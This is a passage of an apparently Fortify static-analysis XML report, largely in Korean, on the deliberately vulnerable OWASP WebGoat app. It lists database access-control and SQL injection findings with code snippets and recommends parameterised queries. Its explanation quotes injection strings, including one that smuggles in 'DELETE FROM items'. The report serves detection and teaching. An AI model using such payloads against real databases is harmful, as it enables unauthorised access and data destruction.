<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>256</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				authorized = answer_results.first();
				</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();
		this.context = context;</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D4CA4F4B439D3CC5963FD05C00F57F10" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 265 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>265</LineStart>
<Snippet>							" AND employee_id = " + employeeId;
					answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
					answer_results = answer_statement.executeQuery( query );
					authorized = answer_results.first();
				}</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="74AC04938CFCEDFF46F73611528D6DC0" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1C6CDE763FDFEA73565DE45436C17643" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 256 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>256</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				authorized = answer_results.first();
				</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>274</LineStart>
<Snippet>		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="81874063900CF8D7DE6D76FD3BB9679B" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 getUserName() 메서드는 공격자가 제어하는 기본 키를 포함하는 203 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>271</LineStart>
<Snippet>		enterprise = "true".equals( servlet.getInitParameter( ENTERPRISE ) );
		feedbackAddress = servlet.getInitParameter( FEEDBACK_ADDRESS ) != null ? servlet
				.getInitParameter( FEEDBACK_ADDRESS ) : feedbackAddress;
		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4835BFE84CE7F37B13AFEB4AEB90560D" ruleID="264C499A-C0F5-479E-9758-9E8C24468D70">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 UpdateProfile.java의 createEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 340 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>139</LineStart>
<Snippet>	String address2 = request.getParameter(CrossSiteScripting.ADDRESS2);
	int manager = Integer.parseInt(request
		.getParameter(CrossSiteScripting.MANAGER));
	String startDate = request.getParameter(CrossSiteScripting.START_DATE);
	int salary = Integer.parseInt(request</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6C4DCAF0482F77B264F2491154246A8B" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 WSDLScanning.java의 getResults() 메서드는 공격자가 제어하는 기본 키를 포함하는 281 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>281</LineStart>
<Snippet>	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try
	    {</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>322</LineStart>
<Snippet>

    public String getLastName(int id)
    {
	String result = getResults(id, "last_name");</Snippet>
<TargetFunction>getLastName(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6B52EFAB231FF1EECBDA107D4F7E0B96" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 FindProfile.java의 findEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 144 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>144</LineStart>
<Snippet>				ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setString(1, "%" + pattern + "%");
		answer_statement.setString(2, "%" + pattern + "%");
		ResultSet answer_results = answer_statement.executeQuery();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="27EA5D1457900A54A4197DE32F21468E" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DE4E5C3A79A3DBC0A9E7878840E8F06E" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorizedForEmployee() 메서드는 공격자가 제어하는 기본 키를 포함하는 312 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>312</LineStart>
<Snippet>				PreparedStatement answer_statement = WebSession.getConnection(s).prepareStatement( query, 
						ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				answer_statement.setInt(1, userId);
				answer_statement.setInt(2, employeeId);
				ResultSet answer_results = answer_statement.executeQuery();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="58">
                        <groupTitle>SQL Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>ViewDatabase.java의 90 줄에서 createContent() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>SQL injection 오류는 다음 경우에 발생합니다.

1. 신뢰할 수 없는 소스에서 데이터가 프로그램에 입력됩니다.



2. 데이터를 사용하여 SQL 쿼리를 동적으로 생성합니다.



예제 1: 다음 코드는 지정된 이름과 일치하는 항목을 검색하는 SQL 쿼리를 동적으로 생성하고 실행합니다. 쿼리는 표시되는 항목을 항목 소유자가 현재 인증된 사용자의 이름과 일치하는 항목으로 제한합니다.


...
	String userName = ctx.getAuthenticatedUserName();
	String itemName = request.getParameter("itemName");
	String query = "SELECT * FROM items WHERE owner = '"
				+ userName + "' AND itemname = '"
				+ itemName + "'";
	ResultSet rs = stmt.execute(query);
...


쿼리는 다음 코드를 실행하려고 합니다.


	SELECT * FROM items
	WHERE owner = &lt;userName&gt;
	AND itemname = &lt;itemName&gt;;


하지만 상수인 기본 쿼리 문자열과 사용자 입력 문자열을 연결하여 쿼리를 동적으로 생성하기 때문에, 쿼리는 itemName에 작은따옴표가 들어 있지 않은 경우에만 정확하게 동작합니다. 사용자 이름이 wiley인 공격자가 itemName에 문자열 "name' OR 'a'='a"를 입력하면 쿼리는 다음과 같이 생성됩니다.


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name' OR 'a'='a';


OR 'a'='a' 조건을 추가하면 where 절이 항상 true로 평가하기 때문에 쿼리는 훨씬 간단한 다음 쿼리와 논리적으로 동일하게 됩니다.


	SELECT * FROM items;


공격자는 이렇게 쿼리를 단순화하여 쿼리가 인증된 사용자가 소유한 항목만 반환해야 한다는 요구 사항을 무시할 수 있습니다. 이제 쿼리는 지정된 소유자와 관계없이 items 테이블에 저장된 모든 항목을 반환합니다.

예제 2: 이 예제는 Example 1에서 생성하여 수행한 쿼리에 또 다른 악성 값이 전달될 때의 결과를 검토합니다. 사용자 이름이 wiley인 공격자가 itemName에 문자열 "name'; DELETE FROM items; --"를 입력하면 쿼리는 다음과 같은 두 개의 쿼리가 됩니다.


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name';

	DELETE FROM items;

	--'


Microsoft(R) SQL Server 2000을 포함한 많은 데이터베이스 서버에서 여러 SQL 문을 세미콜론으로 구분하여 한꺼번에 실행하는 것을 허용합니다. 이 공격 문자열은 세미콜론으로 구분한 문에 대한 일괄 실행을 허용하지 않는 Oracle 및 기타 데이터베이스 서버에서는 오류를 일으키지만 일괄 실행을 허용하는 데이터베이스에서는 공격자가 이런 종류의 공격으로 데이터베이스에 대해 임의의 명령을 실행할 수 있습니다.

마지막의 하이픈 쌍(--)을 보겠습니다. 이는 대부분의 데이터베이스 서버에서 해당 문에 대한 나머지 부분을 주석으로 처리하여 실행하지 말라는 의미로 해석됩니다[4]. 이 경우, 이 주석 문자는 수정된 쿼리에서 마지막의 작은따옴표 한쪽을 제거하는 역할을 합니다. 주석을 이런 식으로 사용할 수 없는 데이터베이스에서도 Example 1에서 본 것과 유사한 속임수를 사용하면 대부분의 공격이 효과를 거둘 수 있습니다. 공격자가 문자열 "name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a"를 입력하여 다음 세 가지 유효한 문을 만드는 경우입니다.


	SELECT * FROM items
	WHERE owner = 'wiley'
	AND itemname = 'name';

	DELETE FROM items;

	SELECT * FROM items WHERE 'a'='a';


모바일 환경에서는 SQL Injection과 같은 전형적인 웹 응용 프로그램 취약성이 발생하지 않는다고 생각하는 사용자도 있습니다. 자기 자신을 공격하는 사용자는 없을 것이라 여기기 때문입니다. 그러나 모바일 플랫폼의 핵심 요소는 다양한 소스에서 다운로드되어 같은 장치에서 함께 실행되는 응용 프로그램이라는 점을 유념해야 합니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 프로세스 간 통신을 포함하도록 모바일 응용 프로그램의 공격 표면을 확장해야 합니다.

예제 3: 다음 코드는 Example 1을 Android 플랫폼에 맞게 조정합니다.


...
        PasswordAuthentication pa = authenticator.getPasswordAuthentication();
        String userName = pa.getUserName();
        String itemName = this.getIntent().getExtras().getString("itemName");
        String query = "SELECT * FROM items WHERE owner = '"
                                + userName + "' AND itemname = '"
                                + itemName + "'";
        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
        Cursor c = db.rawQuery(query, null);
...


SQL Injection 공격을 방지하는 한 가지 기존의 접근 방식은 공격을 입력값 검증 문제로 처리하고 안전한 값 목록(허용 목록)의 문자만 받거나 악의적일 가능성이 있는 값 목록(거부 목록)을 식별하여 이스케이프 처리하는 것입니다. 허용 목록 검사는 엄격한 입력값 검증 규칙을 이행하는 매우 효율적인 수단이 되기도 하지만, 매개 변수가 있는 SQL 문은 유지 관리가 쉽고 보다 강력한 보안을 제공할 수 있습니다. 대부분의 경우 거부 목록 구현은 SQL Injection 공격 방지의 효과를 떨어뜨리는 허점이 아주 많습니다. 예를 들어, 공격자는 다음과 같이 할 수 있습니다.

- 따옴표로 묶지 않은 필드를 노립니다.
- 이스케이프 처리된 메타 문자를 사용할 필요가 없는 방법을 찾습니다.
- 저장 프로시저(Stored procedure)를 사용하여 삽입된 메타 문자를 숨깁니다.

SQL 쿼리에 입력할 때 수동으로 문자를 이스케이프 처리하는 방법도 있지만 이것으로 SQL injection 공격으로부터 응용 프로그램을 보호할 수는 없습니다.

SQL injection 공격을 다루는 데 주로 제시되는 다른 솔루션은 저장 프로시저(stored procedure)를 사용하는 것입니다. 저장 프로시저(Stored procedure)는 일부 유형의 SQL injection 공격은 막을 수 있지만 다른 많은 유형은 막지 못합니다. 저장 프로시저(Stored procedure)는 일반적으로 매개 변수에 전달되는 SQL 문의 유형을 제한하여 SQL injection 공격을 막습니다. 하지만 이 제약을 피할 수 있는 많은 방법이 있어 수많은 비정상적인 문을 저장 프로시저(Stored procedure)에 전달할 수 있습니다. 되풀이하지만, 저장 프로시저(Stored procedure)는 일부 익스플로이트는 막을 수 있지만 응용 프로그램을 SQL injection 공격에 대해 안전하게 보호할 수는 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>SQL injection 취약점의 원인은 공격자가 SQL 쿼리의 컨텍스트를 변경하여 프로그래머가 데이터로 해석되기를 바라는 값을 명령으로 해석되도록 만들 수 있다는 점입니다. SQL 쿼리를 생성할 때, 프로그래머는 무엇이 명령으로 해석되어야 하고 무엇이 데이터로 해석되어야 하는지 알고 있습니다. 매개 변수가 있는 SQL 문은 데이터 위주의 컨텍스트 변경을 허용하지 않고 거의 모든 SQL injection 공격을 방지하여 이를 이행합니다. 매개 변수가 있는 SQL 문은 일반 SQL 문자열을 사용하여 생성되지만, 사용자가 제공하는 데이터를 포함해야 하는 경우에 이후에 삽입되는 데이터의 자리 표시자인 바인딩 매개 변수를 포함합니다. 다시 말해, 바인딩 매개 변수를 사용하여 프로그래머가 명령으로 처리해야 할 것과 데이터로 처리해야 할 것을 데이터베이스에 명시적으로 지정할 수 있습니다. 프로그램이 문을 실행할 준비가 되면 각 바인딩 매개 변수에 사용할 런타임 값을 데이터베이스에 지정하여 데이터가 명령 수정 코드로 해석될 위험을 피할 수 있습니다.

사용자가 제공하는 문자열을 연결하는 대신 매개 변수가 있는 SQL 문을 사용하도록 다음과 같이 예제 1을 다시 작성할 수 있습니다.


...
	String userName = ctx.getAuthenticatedUserName();
	String itemName = request.getParameter("itemName");
	String query = "SELECT * FROM items WHERE itemname=? AND owner=?";
	PreparedStatement stmt = conn.prepareStatement(query);
	stmt.setString(1, itemName);
	stmt.setString(2, userName);
	ResultSet results = stmt.execute();
...


Android에 해당하는 코드는 다음과 같습니다.


...
	PasswordAuthentication pa = authenticator.getPasswordAuthentication();
	String userName = pa.getUserName();
	String itemName = this.getIntent().getExtras().getString("itemName");
	String query = "SELECT * FROM items WHERE itemname=? AND owner=?";
	SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);
	Cursor c = db.rawQuery(query, new Object[]{itemName, userName});
...


흔히 보고서 생성 코드에서 볼 수 있는 복잡한 시나리오에서는 WHERE 절의 동적 제약 조건 추가와 같이, 사용자 입력이 SQL 문의 구조를 결정합니다. 그렇다고 이 요구 사항이 사용자 입력을 연결하여 쿼리 문자열을 만드는 것을 정당화할 수는 없습니다. 사용자 입력이 명령 구조에 영향을 미쳐야 하는 경우 간접 참조를 사용하여 SQL injection 공격을 예방합니다. 즉, SQL 문에 포함시킬 여러 요소에 해당하는 유효한 문자열 집합을 만듭니다. 문을 만들 때 사용자 입력을 사용하여 이 응용 프로그램 제어 값 집합에서 값을 선택합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 이 때, 흔히 저지르는 실수는 사용자가 제어하는 문자열을 연결하여 생성한, 매개 변수가 있는 SQL 문을 사용하는 것입니다. 물론 이렇게 하면 매개 변수가 있는 SQL 문을 사용하는 목적이 무산됩니다. 매개 변수가 있는 SQL 문을 형성하는 문자열이 응용 프로그램에서 제어하는 상수인지 확신할 수 없는 경우, 문자열이 SQL 문자열로 직접 실행되지 않기 때문에 안전하다고 가정할 수 없습니다. SQL 문에서 사용자 제어 문자열의 모든 사용을 철저하게 조사하고 쿼리의 의미를 수정하는 데 사용되는 일이 없는지 확인해야 합니다.

2. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.

3. SQL Injection 문제는 데이터 흐름 수정 작업 후에도 계속해서 보고될 수 있습니다(우선 순위 값은 감소). Fortify Static Code Analyzer에서 사용자 제어 입력이 SQL 문 구성에 사용되고 있다는 분명한 데이터 흐름 증거가 발견되면 높음/심각 우선 순위의 데이터 흐름 문제가 보고됩니다. Fortify Static Code Analyzer에서 데이터 소스를 결정할 수 없고 소스가 동적으로 변경될 수 있는 경우 낮음/중간 우선 순위의 의미 체계 문제가 보고됩니다. 이 전략은 SQL Injection과 같이 악용의 잠재적 영향이 거짓 긍정 문제를 감사하는 불편함보다 큰 일부 취약성 범주에 채택되었습니다.

4. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>58</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="4B75C779AA009A701775FF47139B7184" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.java의 118 줄에서 getEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3B9CAEDBA3EF988863E7FA1E4EDE4143" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DeleteProfile.java의 144 줄에서 deleteEmployeeProfile_BACKUP() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>144</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>executeUpdate()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FF21E2912F55A44C41F11B4A151F2DA6" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 295 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>295</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
